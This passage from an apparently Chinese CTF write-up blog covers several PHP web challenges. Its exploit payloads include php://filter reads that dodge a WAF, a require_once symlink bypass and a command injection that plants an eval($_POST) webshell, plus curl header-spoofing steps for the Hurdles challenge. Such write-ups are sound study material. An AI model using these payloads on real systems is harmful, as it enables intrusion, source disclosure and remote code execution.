class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>绕过 <code>$text</code><br><code>php://input</code> or <code>data://text/plain</code><br>得到 <code>next.php</code><br>考察点：<a href="https://xz.aliyun.com/t/2557">preg_replace()的&#x2F;e模式存在命令执行漏洞</a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><strong>Hint:</strong> </p><ul><li>&#x2F;e模式的php版本问题，在php5.5.x版本已经弃用，在5.6.9版本下，虽然会报错，但是还能够使用这个特性；7.0不能用了</li></ul><p><a href="https://blog.csdn.net/RABCDXB/article/details/115363699">参考 Sk1y_ZJCTF，不过如此笔记</a> </p><hr><h1 id="WMCTF2020-Make-PHP-Great-Again-2-0"><a href="#WMCTF2020-Make-PHP-Great-Again-2-0" class="headerlink" title="[WMCTF2020]Make PHP Great Again 2.0"></a>[WMCTF2020]Make PHP Great Again 2.0</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">require_once</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>在 <code>php</code> 中，<code>require_once</code> 在调用时 <code>php</code> 会检查该文件是否已经被包含过，如果是则不会再次包含，也不会包含当前文件（就是这题 <code>index.php</code> 不会包含 <code>index.php</code> 和 <code>flag.php</code>）</p><h2 id="一个-php-高版本-trick"><a href="#一个-php-高版本-trick" class="headerlink" title="一个 php 高版本 trick"></a>一个 php 高版本 trick</h2><p><code>require_once</code>包含的软链接层数较多时 <code>once</code> 的<strong>hash匹配</strong>会直接失效造成<strong>重复包含</strong></p><p><code>/proc/self</code> 指向当前进程的 <code>/proc/pid/</code><br><code>/proc/self/root/</code> 是指向 <code>/</code> 的符号链接</p><p><a href="https://www.anquanke.com/post/id/213235#h2-8">php源码分析 require_once 绕过不能重复包含文件的限制</a></p><p>当时题目出现了非预期解</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">powershell</div></div><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://<span class="keyword">filter</span>/convert.base64<span class="literal">-encode</span>/resource=/WWW/../../proc/self/cwd/flag.php</span><br></pre></td></tr></table></figure></div><p>与上文差不多的情况， <code>cwd</code> 连接到程序工作路径，</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">powershell</div></div><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">第一个</span><br><span class="line">require_once(<span class="string">&#x27;&#x27;</span>/WWW/../../proc/self/cwd/flag.php);</span><br><span class="line"></span><br><span class="line">第二个</span><br><span class="line">require_once(<span class="string">&#x27;flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure></div><hr><h1 id="SUCTF-2018-GetShell"><a href="#SUCTF-2018-GetShell" class="headerlink" title="[SUCTF 2018]GetShell"></a>[SUCTF 2018]GetShell</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$contents</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]))&#123;</span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$contents</span>,<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$black_char</span> <span class="keyword">as</span> <span class="variable">$b</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$data</span>, <span class="variable">$b</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;illegal char&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;     </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div><p>文件上传，然后会截取内容，从第六位开始的内容都会赋给data，然后会有一个黑名单，如果data中存在黑名单字符，就会die。</p><p>经过 fuzz 发现大部分字符什么数字啊，英文啊  都被过滤，想到p神的trick</p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></p><hr><h1 id="羊城杯-2020-Easyphp2"><a href="#羊城杯-2020-Easyphp2" class="headerlink" title="[羊城杯 2020]Easyphp2"></a>[羊城杯 2020]Easyphp2</h1><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303100800162.jpg" data-fancybox="group" data-caption="Easyphp_1" class="fancybox"><img alt="Easyphp_1" title="Easyphp_1" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303100800162.jpg" class="lazyload"></a></p><p>目标URL显示为</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://targetsite:80/?file=GWHT.php</span><br></pre></td></tr></table></figure></div><p>尝试伪协议</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://targetsite:80/?file=php://filter/convert.base64-encode/resource=GWHT.php</span><br></pre></td></tr></table></figure></div><p>回显被WAF，尝试进行URLEncode二次加密 </p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/read=convert.%2562%2561%2573%2565%2536%2534-encode/resource=GWHT.php</span><br></pre></td></tr></table></figure></div><p>得到 <code>GWHT.php</code> 源码</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;max_execution_time&#x27;</span>, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&#x27;pass&#x27;</span>] !== <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;PASS&#x27;</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;pass&#x27;</span>, <span class="string">&#x27;PASS&#x27;</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;&lt;h2&gt;&#x27;</span>.<span class="string">&#x27;&lt;hacker&gt;&#x27;</span>.<span class="string">&#x27;&lt;h2&gt;&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="string">&#x27;&lt;h1&gt;&#x27;</span>.<span class="string">&#x27;404&#x27;</span>.<span class="string">&#x27;&lt;h1&gt;&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="string">&#x27;Sorry, only people from GWHT are allowed to access this website.&#x27;</span>.<span class="string">&#x27;23333&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;h1&gt;A Counter is here, but it has someting wrong&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;form&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> value=<span class="string">&quot;GWHT.php&quot;</span> name=<span class="string">&quot;file&quot;</span>&gt;</span><br><span class="line">    &lt;textarea style=<span class="string">&quot;border-radius: 1rem;&quot;</span> type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;count&quot;</span> rows=<span class="number">10</span> cols=<span class="number">50</span>&gt;&lt;/textarea&gt;&lt;br /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;count&quot;</span>])) &#123;</span><br><span class="line">    <span class="variable">$count</span> = <span class="variable">$_GET</span>[<span class="string">&quot;count&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/;|base64|rot13|base32|base16|&lt;\?php|#/i&#x27;</span>, <span class="variable">$count</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;The Count is: &quot;</span> . <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;printf \&#x27;&#x27;</span> . <span class="variable">$count</span> . <span class="string">&#x27;\&#x27; | wc -c&#x27;</span>) . <span class="string">&quot;&lt;/h2&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>存在 <code>robots.txt</code> 回显 <code>Disallow: /?file=check.php</code></p><p>获得 <code>check.php</code> 源码</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pass</span> = <span class="string">&quot;GWHT&quot;</span>;</span><br><span class="line"><span class="comment">// Cookie password.</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Here is nothing, isn&#x27;t it ?&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /&#x27;</span>);</span><br></pre></td></tr></table></figure></div><p>抓包修改 cookie pass</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303100809698.jpg" data-fancybox="group" data-caption="Easyphp_2" class="fancybox"><img alt="Easyphp_2" title="Easyphp_2" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303100809698.jpg" class="lazyload"></a></p><p>然后根据之前获得的 <code>GWHT.php</code> 源码分析，<code>count</code> 存在过滤 </p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/;|base64|rot13|base32|base16|&lt;\?php|#/i&#x27;</span>, <span class="variable">$count</span>))</span><br></pre></td></tr></table></figure></div><p>但是仍然可以通过URL编码过滤，通过构造shell，进行蚁剑连接</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;|echo &quot;&lt;?= eval(\$_POST[&#x27;</span>yakko<span class="string">&#x27;])?&gt;&quot; &gt; test.php&#x27;</span></span><br><span class="line"><span class="string">&#x27;|echo &quot;&lt;?= exec(&quot;env&quot;);?&gt;&quot; &gt; test123.php&#x27;</span></span><br><span class="line"></span><br><span class="line">%<span class="number">27</span>%<span class="number">7</span>Cecho%<span class="number">20</span>%<span class="number">22</span>%<span class="number">3</span>C%<span class="number">3</span>F%<span class="number">3</span>D%<span class="number">20</span><span class="keyword">eval</span>(%<span class="number">5</span>C%<span class="number">24</span>_POST%<span class="number">5</span>B%<span class="number">27</span>yakko%<span class="number">27</span>%<span class="number">5</span>D)%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">20</span>%<span class="number">3</span>E%<span class="number">20</span>test.php%<span class="number">27</span></span><br><span class="line"></span><br><span class="line">%<span class="number">27</span>%<span class="number">7</span>Cecho%<span class="number">20</span>%<span class="number">22</span>%<span class="number">3</span>C%<span class="number">3</span>F%<span class="number">3</span>D%<span class="number">20</span>exec(%<span class="number">22</span>env%<span class="number">22</span>)%<span class="number">3</span>B%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">20</span>%<span class="number">3</span>E%<span class="number">20</span>test123.php%<span class="number">27</span></span><br><span class="line"></span><br><span class="line">GET /?file=GWHT.php&amp;count=%<span class="number">27</span>%<span class="number">7</span>Cecho%<span class="number">20</span>%<span class="number">22</span>%<span class="number">3</span>C%<span class="number">3</span>F%<span class="number">3</span>D%<span class="number">20</span><span class="keyword">eval</span>(%<span class="number">5</span>C%<span class="number">24</span>_POST%<span class="number">5</span>B%<span class="number">27</span>yakko%<span class="number">27</span>%<span class="number">5</span>D)%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">20</span>%<span class="number">3</span>E%<span class="number">20</span>test.php%<span class="number">27</span></span><br></pre></td></tr></table></figure></div><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303100830729.jpg" data-fancybox="group" data-caption="Easyphp_3" class="fancybox"><img alt="Easyphp_3" title="Easyphp_3" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303100830729.jpg" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">txt</div></div><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">My password hash is 877862561ba0162ce610dd8bf90868ad414f0ec6.</span><br></pre></td></tr></table></figure></div><p>命令行一直操作不了之后，想起了可以直接在蚁剑新建webshell，属于是纯纯铸币了 &#x3D; &#x3D;</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303100942426.jpg" data-fancybox="group" data-caption="Easyphp_4" class="fancybox"><img alt="Easyphp_4" title="Easyphp_4" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303100942426.jpg" class="lazyload"></a></p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303100943953.jpg" data-fancybox="group" data-caption="Easyphp_5" class="fancybox"><img alt="Easyphp_5" title="Easyphp_5" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303100943953.jpg" class="lazyload"></a></p><hr><h1 id="BSidesCF-2020-Hurdles"><a href="#BSidesCF-2020-Hurdles" class="headerlink" title="[BSidesCF 2020]Hurdles"></a>[BSidesCF 2020]Hurdles</h1><p>You’ll be rewarded with a flag if you can make it over some &#x2F;hurdles.</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://target.site/hurdles</span><br><span class="line"></span><br><span class="line"><span class="comment"># respond:</span></span><br><span class="line"><span class="comment"># I&#x27;m sorry, I was expecting the PUT Method.</span></span><br></pre></td></tr></table></figure></div><p>改请求包为 <code>PUT</code> 说明可以用 <code>curl</code></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT http://target.site/hurdles</span><br><span class="line"><span class="comment"># I&#x27;m sorry, Your path would be more exciting if it ended in !</span></span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT http://target.site/hurdles!</span><br><span class="line"><span class="comment"># You&#x27;ll be rewarded with a flag if you can make it over some /hurdles.</span></span><br><span class="line"></span><br><span class="line">curl -X PUT http://target.site/hurdles/!</span><br><span class="line"><span class="comment"># I&#x27;m sorry, Your URL did not ask to `get` the `flag` in its query string.</span></span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT <span class="string">&quot;http://target.site/hurdles/!?get=flag&quot;</span></span><br><span class="line"><span class="comment"># I&#x27;m sorry, I was looking for a parameter named &amp;=&amp;=&amp;</span></span><br><span class="line"></span><br><span class="line">curl -X PUT <span class="string">&quot;http://target.site/hurdles/!?get=flag&amp;%26%3D%26%3D%26=1&quot;</span></span><br><span class="line"><span class="comment"># I&#x27;m sorry, I expected &#x27;&amp;=&amp;=&amp;&#x27; to equal &#x27;%00</span></span><br></pre></td></tr></table></figure></div><p>需要将 <code>&amp;=&amp;=&amp;</code> 的值等于 <code>%00</code>（换行符），其后还包含了一个换行符，也是进行URL编码：<code>%2500%0a</code><br><code>%2500</code> &#x3D;&#x3D; <code>%00</code> &amp;&amp;  <code>%0a</code> &#x3D;&#x3D; <code>linefeed</code> (换行)</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT <span class="string">&quot;http://target.site/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&quot;</span></span><br><span class="line"><span class="comment"># I&#x27;m sorry, Basically, I was expecting the username player.</span></span><br><span class="line"></span><br><span class="line">curl  -u, --user &lt;user:password&gt; Server user and password</span><br></pre></td></tr></table></figure></div><p>随便尝试一下</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT <span class="string">&quot;http://target.site/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&quot;</span> -u <span class="string">&quot;player:player&quot;</span></span><br><span class="line"><span class="comment"># I&#x27;m sorry, Basically, I was expecting the password of the hex representation of the md5 of the string &#x27;open sesame&#x27;</span></span><br></pre></td></tr></table></figure></div><p>提示密码为 <code>open sesame</code> 的md5加密值 <code>54ef36ec71201fdf9d1423fd26f97f6b</code> (还必须32位 就很过分)</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT <span class="string">&quot;http://target.site/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&quot;</span> -u <span class="string">&quot;player:54ef36ec71201fdf9d1423fd26f97f6b&quot;</span></span><br><span class="line"><span class="comment"># I&#x27;m sorry, I was expecting you to be using a 1337 Browser.</span></span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">curl -A, --user-agent &lt;name&gt;    Send User-Agent &lt;name&gt; to server</span><br><span class="line"></span><br><span class="line">curl -X PUT <span class="string">&quot;http://target.site/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&quot;</span> -u <span class="string">&quot;player:54ef36ec71201fdf9d1423fd26f97f6b&quot;</span> -A <span class="string">&quot;1337 Browser&quot;</span></span><br><span class="line"><span class="comment"># I&#x27;m sorry, I was expecting your browser version (v.XXXX) to be over 9000!</span></span><br><span class="line"></span><br><span class="line">curl -X PUT <span class="string">&quot;http://target.site/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&quot;</span> -u <span class="string">&quot;player:54ef36ec71201fdf9d1423fd26f97f6b&quot;</span> -A <span class="string">&quot;1337 Browser v.9999&quot;</span></span><br><span class="line"><span class="comment"># I&#x27;m sorry, I was eXpecting this to be Forwarded-For someone!</span></span><br></pre></td></tr></table></figure></div><p>继续加 <code>XFF</code></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT <span class="string">&quot;http://target.site/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&quot;</span> -u <span class="string">&quot;player:54ef36ec71201fdf9d1423fd26f97f6b&quot;</span> -A <span class="string">&quot;1337 Browser v.9999&quot;</span> -H <span class="string">&quot;X-Forwarded-For:127.0.0.1&quot;</span></span><br><span class="line"><span class="comment"># I&#x27;m sorry, I was eXpecting this to be Forwarded For someone through another proxy!</span></span><br><span class="line"><span class="comment"># 还要代理转发</span></span><br><span class="line"></span><br><span class="line">curl -X PUT <span class="string">&quot;http://target.site/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&quot;</span> -u <span class="string">&quot;player:54ef36ec71201fdf9d1423fd26f97f6b&quot;</span> -A <span class="string">&quot;1337 Browser v.9999&quot;</span> -H <span class="string">&quot;X-Forwarded-For:4.4.4.4,127.0.0.1&quot;</span></span><br><span class="line"><span class="comment"># I&#x27;m sorry, I was expecting the forwarding client to be 13.37.13.37</span></span><br><span class="line"></span><br><span class="line">curl -X PUT <span class="string">&quot;http://target.site/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&quot;</span> -u <span class="string">&quot;player:54ef36ec71201fdf9d1423fd26f97f6b&quot;</span> -A <span class="string">&quot;1337 Browser v.9999&quot;</span> -H <span class="string">&quot;X-Forwarded-For:13.37.13.37,127.0.0.1&quot;</span></span><br><span class="line"><span class="comment"># I&#x27;m sorry, I was expecting a Fortune Cookie</span></span><br></pre></td></tr></table></figure></div><p>别太过分了！</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT <span class="string">&quot;http://target.site/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&quot;</span> -u <span class="string">&quot;player:54ef36ec71201fdf9d1423fd26f97f6b&quot;</span> -A <span class="string">&quot;1337 Browser v.9999&quot;</span> -H <span class="string">&quot;X-Forwarded-For:13.37.13.37,127.0.0.1&quot;</span> -b <span class="string">&quot;Fortune=1&quot;</span></span><br><span class="line"><span class="comment"># I&#x27;m sorry, I was expecting the cookie to contain the number of the HTTP Cookie (State Management Mechanism) RFC from 2011.</span></span><br></pre></td></tr></table></figure></div><p>需要 <code>Cookie</code> 中来自 <code>State Management Mechanism</code> <code>2011年</code> 的 <code>RFC编号</code><br><a href="https://datatracker.ietf.org/doc/search">找到这个网站</a></p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303151223669.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303151223669.jpg" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div 